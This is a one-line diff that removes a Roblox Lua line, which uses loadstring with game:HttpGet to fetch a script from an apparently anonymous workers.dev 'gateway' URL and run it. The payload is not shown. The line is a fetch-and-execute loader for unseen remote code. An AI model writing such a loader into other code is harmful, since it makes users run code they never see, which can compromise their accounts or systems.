@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://lazybear-gateway.iusemaybehook.workers.dev/?file=1468213301233062013_a.lua"))()
